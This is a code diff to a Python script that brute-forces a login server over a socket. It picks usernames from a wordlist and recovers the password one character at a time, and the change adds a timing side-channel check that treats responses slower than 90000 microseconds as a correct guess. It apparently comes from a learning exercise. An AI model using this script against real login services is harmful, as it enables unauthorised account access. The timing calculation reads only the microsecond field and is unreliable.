@@ -1,10 +1,9 @@
+import datetime
 import socket
 import itertools
 import sys
 import string
 import json
-
-
 HOST = sys.argv[1]
 PORT = int(sys.argv[2])
 ADRESS = (HOST, PORT)
@@ -24,10 +23,13 @@ def variant(file):
 def send_receive(socket_, msg_):
     data = json.dumps(msg_, indent=4).encode()
     # sending through socket
+    start = datetime.datetime.now()
     socket_.send(data)
     response = socket_.recv(10240)
+    end = datetime.datetime.now()
     response_py = json.loads(response.decode())
-    return response_py
+    timing = end.microsecond - start.microsecond
+    return [response_py, timing]
 
 
 var_login = variant("logins.txt")
@@ -40,7 +42,7 @@ with socket.socket() as s:
         message = {"login": login,
                    "password": " "}
         result = send_receive(s, message)
-        if result == {"result": "Wrong password!"}:
+        if result[0] == {"result": "Wrong password!"}:
             right_login = "".join(login)
             flag = True
             break
@@ -58,11 +60,11 @@ with socket.socket() as s:
                 pass
             except ConnectionAbortedError:
                 pass
-            if pass_status == {"result": "Connection success!"}:
+            if pass_status[0] == {"result": "Connection success!"}:
                 password += letter
                 flag = True
                 break
-            if pass_status == {'result': "Exception happened during login"}:
+            if pass_status[1] >= 90000:
                 password += letter
 
 result = {"login": right_login, "password": password}
